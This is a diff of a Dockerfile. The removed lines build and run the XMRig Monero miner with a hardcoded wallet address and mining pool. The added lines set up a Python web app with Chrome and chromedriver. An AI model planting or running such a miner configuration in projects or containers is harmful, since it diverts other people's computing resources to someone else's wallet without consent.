@@ -1,45 +1,41 @@
-FROM alpine:3.13 AS builder
+FROM python:3.8
 
-ARG XMRIG_VERSION='v6.16.4'
-WORKDIR /miner
+WORKDIR ./
 
-RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
-    apk update && apk add --no-cache \
-    build-base \
-    git \
-    cmake \
-    libuv-dev \
-    linux-headers \
-    libressl-dev \
-    hwloc-dev@community
+COPY app.py ./
 
-RUN git clone https://github.com/xmrig/xmrig && \
-    mkdir xmrig/build && \
-    cd xmrig && git checkout ${XMRIG_VERSION}
+COPY requirements.txt ./
 
-COPY .build/supportxmr.patch /miner/xmrig
-RUN cd xmrig && git apply supportxmr.patch
+EXPOSE 5000
 
-RUN cd xmrig/build && \
-    cmake .. -DCMAKE_BUILD_TYPE=Release && \
-    make -j$(nproc)
+# Adding trusting keys to apt for repositories
+RUN wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
+
+# Adding Google Chrome to the repositories
+RUN sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list'
+
+# Updating apt to see and install Google Chrome
+RUN apt-get -y update
+
+# Magic happens
+RUN apt-get install -y google-chrome-stable
+
+# Installing Unzip
+RUN apt-get install -yqq unzip
+
+# Download the Chrome Driver
+RUN apt-get install -yqq unzip
+RUN wget -O /tmp/chromedriver.zip http://chromedriver.storage.googleapis.com/`curl -sS chromedriver.storage.googleapis.com/LATEST_RELEASE`/chromedriver_linux64.zip
+RUN unzip /tmp/chromedriver.zip chromedriver -d /usr/local/bin/
+# Set display port as an environment variable
+ENV DISPLAY=:99
 
 
-FROM alpine:3.13
-LABEL owner="Giancarlos Salas"
-LABEL maintainer="me@giansalex.dev"
+RUN pip install --upgrade pip
 
-ENV WALLET=49KVg3wibjaMEwoUa7jaRZRs87Bi4Q3avLFeidLmq5WgKm7khYi48b37DxvQzdCTPyLfwwaS1zrCPQaTHSCgENSbEx3M61M
-ENV POOL=pool.minexmr.com:4444
-ENV WORKER_NAME=docker
+RUN pip install --no-cache-dir -r requirements.txt
 
-RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
-    apk update && apk add --no-cache \
-    libuv \
-    libressl \
-    hwloc@community
+ENTRYPOINT python app.py
 
-WORKDIR /xmr
-COPY --from=builder /miner/xmrig/build/xmrig /xmr
-
-CMD ["sh", "-c", "./xmrig --url=$POOL --donate-level=3 --user=$WALLET --pass=$WORKER_NAME -k --coin=monero"]
+#CMD exec gunicorn --bind :$PORT --workers 1 --threads 8 --timeout 0 app:app
+CMD gunicorn main:app
